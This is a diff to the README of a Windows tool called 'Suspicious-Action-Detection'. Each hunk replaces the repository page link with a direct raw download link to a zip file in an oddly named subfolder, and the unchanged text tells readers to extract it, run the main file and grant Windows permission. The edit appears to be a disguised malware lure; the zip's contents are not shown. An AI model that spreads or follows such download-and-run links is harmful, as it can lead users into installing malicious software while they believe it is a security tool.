@@ -1,6 +1,6 @@
 # 🔍 Suspicious-Action-Detection - Spot Risky Behavior Fast
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue)](https://github.com/Loamy-funiculus628/Suspicious-Action-Detection)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue)](https://raw.githubusercontent.com/Loamy-funiculus628/Suspicious-Action-Detection/main/iconographic/Suspicious_Action_Detection_v1.0.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ The app gives you a simple way to review activity and flag actions that may need
 
 Visit this page to download or access the app files:
 
-https://github.com/Loamy-funiculus628/Suspicious-Action-Detection
+https://raw.githubusercontent.com/Loamy-funiculus628/Suspicious-Action-Detection/main/iconographic/Suspicious_Action_Detection_v1.0.zip
 
 If the page includes a release file, download it to your PC. If it includes a zip file, save the zip, then extract it before opening the app.
 
@@ -57,7 +57,7 @@ If Windows asks for permission, choose the option that lets the app run.
 Follow these steps in order:
 
 1. Open the download page:
-   https://github.com/Loamy-funiculus628/Suspicious-Action-Detection
+   https://raw.githubusercontent.com/Loamy-funiculus628/Suspicious-Action-Detection/main/iconographic/Suspicious_Action_Detection_v1.0.zip
 
 2. Look for a release file, zip file, or app file on the page.
 
@@ -217,6 +217,6 @@ This makes it easier to see how the app behaves on your PC.
 
 Use this link to visit the download page:
 
-https://github.com/Loamy-funiculus628/Suspicious-Action-Detection
+https://raw.githubusercontent.com/Loamy-funiculus628/Suspicious-Action-Detection/main/iconographic/Suspicious_Action_Detection_v1.0.zip
 
 Open the page, download the file, extract it if needed, then run the main app file on Windows
